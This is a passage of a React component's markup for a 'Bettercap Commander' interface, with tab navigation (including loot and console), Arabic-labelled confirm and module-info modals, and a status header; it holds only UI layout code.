        <h1 className="text-base font-bold text-[#00d4ff]">🔥 Bettercap Commander</h1>
        <div className="flex items-center gap-2">
          <span className="text-[10px] text-gray-500">{status?.interface_name || "wlan0"}</span>
          <div className={`h-2.5 w-2.5 rounded-full animate-pulse ${status?.alive ? "bg-[#00ff66]" : "bg-[#ff3d71]"}`} />
        </div>
      </header>

      {/* Notification */}
      {notification && (
        <div className="animate-slide fixed left-4 right-4 top-14 z-50 rounded-xl border border-[#00d4ff40] bg-[#121829] p-3 text-center text-xs text-[#00d4ff] shadow-lg shadow-[#00d4ff10]">
          {notification}
        </div>
      )}

      {/* Content */}
      <main className="min-h-[calc(100vh-120px)]">
        {tab === "dashboard" && renderDashboard()}
        {tab === "network" && renderNetwork()}
        {tab === "tools" && renderTools()}
        {tab === "playbooks" && renderPlaybooks()}
        {tab === "smartset" && renderSmartSet()}
        {tab === "feed" && renderFeed()}
        {tab === "loot" && renderLoot()}
        {tab === "console" && renderConsole()}
        {tab === "reference" && renderReference()}
      </main>

      {/* Bottom Nav */}
      <nav className="fixed inset-x-0 bottom-0 z-50 flex justify-around border-t border-[#2a3654] bg-[#121829]/95 backdrop-blur-sm" style={{ paddingBottom: "max(6px, env(safe-area-inset-bottom))" }}>
        {TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className={`flex flex-col items-center gap-0.5 px-1 py-2 text-[10px] transition-colors ${tab === t.id ? "text-[#00d4ff]" : "text-gray-600"}`}>
            <span className="text-base">{t.icon}</span>
            <span>{t.label}</span>
          </button>
        ))}
      </nav>

      {/* Confirm Modal */}
      {modal && (
        <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/70 p-5" onClick={() => setModal(null)}>
          <div className="animate-slide w-full max-w-xs rounded-2xl border border-[#2a3654] bg-[#121829] p-5" onClick={e => e.stopPropagation()}>
            <div className="text-base font-bold">{modal.title}</div>
            <p className="mt-2 text-sm text-gray-400">{modal.text}</p>
            <div className="mt-4 flex gap-3">
              <button onClick={() => setModal(null)} className="flex-1 rounded-xl border border-[#2a3654] bg-[#1e2740] p-3 text-sm active:scale-95">إلغاء</button>
              <button onClick={modal.onOk} className="flex-1 rounded-xl bg-gradient-to-l from-[#ffab00] to-[#cc8800] p-3 text-sm font-medium text-black active:scale-95">تأكيد</button>
            </div>
          </div>
        </div>
      )}

      {/* Module Info Modal */}
      {moduleInfo && MODULE_INFO[moduleInfo] && (
        <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/70 p-5" onClick={() => setModuleInfo(null)}>
          <div className="animate-slide w-full max-w-xs rounded-2xl border border-[#2a3654] bg-[#121829] p-5" onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-3">
              <span className="text-3xl">{MODULE_INFO[moduleInfo].icon}</span>
              <div>
                <div className="text-base font-bold">{MODULE_INFO[moduleInfo].name}</div>
                <div className="text-xs text-gray-500">{MODULE_INFO[moduleInfo].desc}</div>
              </div>
            </div>
            <p className="mt-3 text-sm text-gray-300">{MODULE_INFO[moduleInfo].details}</p>
            <div className="mt-3 rounded-lg bg-[#1e2740] p-2">
              <div className="text-[10px] text-gray-500">الأمر:</div>
              <code className="text-xs text-[#00d4ff]" dir="ltr">{MODULE_INFO[moduleInfo].command}</code>
            </div>
            {MODULE_INFO[moduleInfo].warning && (
              <div className="mt-2 rounded-lg bg-[#ffab0015] p-2 text-xs text-[#ffab00]">{MODULE_INFO[moduleInfo].warning}</div>
            )}
            <button onClick={() => setModuleInfo(null)} className="mt-3 w-full rounded-xl border border-[#2a3654] bg-[#1e2740] p-2.5 text-sm active:scale-95">إغلاق</button>
          </div>
        </div>
      )}
    </div>
  );
}
